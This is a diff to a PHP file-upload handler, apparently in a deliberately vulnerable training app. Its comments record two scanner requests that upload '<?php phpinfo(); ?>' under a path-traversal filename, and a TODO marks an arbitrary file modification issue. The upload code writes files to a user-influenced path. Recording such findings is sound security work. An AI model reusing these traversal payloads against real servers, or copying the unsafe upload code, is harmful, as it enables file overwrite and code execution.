@@ -39,18 +39,18 @@
 						// Accept-Encoding: identity
 						// Connection: close
 						// Content-Length: 307
-						// Content-Type: multipart/form-data; boundary=c1599c4a9ac1498fbee2e475ac34e828
+						// Content-Type: multipart/form-data; boundary=222b46b950634d1eab80f805a9c6168a
 						//
-						// --c1599c4a9ac1498fbee2e475ac34e828
+						// --222b46b950634d1eab80f805a9c6168a
 						// Content-Disposition: form-data; name="upload"
 						//
 						// 935137890000
-						// --c1599c4a9ac1498fbee2e475ac34e828
+						// --222b46b950634d1eab80f805a9c6168a
 						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
 						// Content-Type: image/png
 						//
 						// <?php phpinfo(); ?>
-						// --c1599c4a9ac1498fbee2e475ac34e828--
+						// --222b46b950634d1eab80f805a9c6168a--
 						//
 						// TODO: AI issue #10, High, Arbitrary File Modification, https://github.com/rbm1718/bricks/issues/10
 						//
@@ -59,18 +59,18 @@
 						// Accept-Encoding: identity
 						// Connection: close
 						// Content-Length: 308
-						// Content-Type: multipart/form-data; boundary=8c1d518282d24c0cb24db063ebcc49d1
+						// Content-Type: multipart/form-data; boundary=077bd008f63e408f8decfe3a619fada5
 						//
-						// --8c1d518282d24c0cb24db063ebcc49d1
+						// --077bd008f63e408f8decfe3a619fada5
 						// Content-Disposition: form-data; name="upload"
 						//
 						// 935137890000
-						// --8c1d518282d24c0cb24db063ebcc49d1
+						// --077bd008f63e408f8decfe3a619fada5
 						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
 						// Content-Type: image/jpeg
 						//
 						// <?php phpinfo(); ?>
-						// --8c1d518282d24c0cb24db063ebcc49d1--
+						// --077bd008f63e408f8decfe3a619fada5--
 						//
 						if (move_uploaded_file($_FILES['userfile']['tmp_name'],$destination)) {
 							echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
